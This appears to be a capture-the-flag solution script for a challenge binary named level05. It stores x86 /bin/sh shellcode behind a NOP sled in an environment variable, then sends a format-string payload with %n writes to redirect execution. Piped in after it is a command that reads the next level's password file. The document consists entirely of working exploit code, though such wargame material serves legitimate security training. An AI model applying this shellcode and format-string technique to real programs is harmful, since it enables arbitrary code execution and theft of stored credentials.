unset LS_COLORS
export SHELLCODE=$(python -c 'print("\x90" * 20 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80")')
(python -c 'print("\xe0\x97\x04\x08" + "A" * 4 + "\xe2\x97\x04\x08" + "%08x" * 8 + "%056758x" + "%n" + "%08701x" + "%n")'; echo "cat /home/users/level06/.pass") | ./level05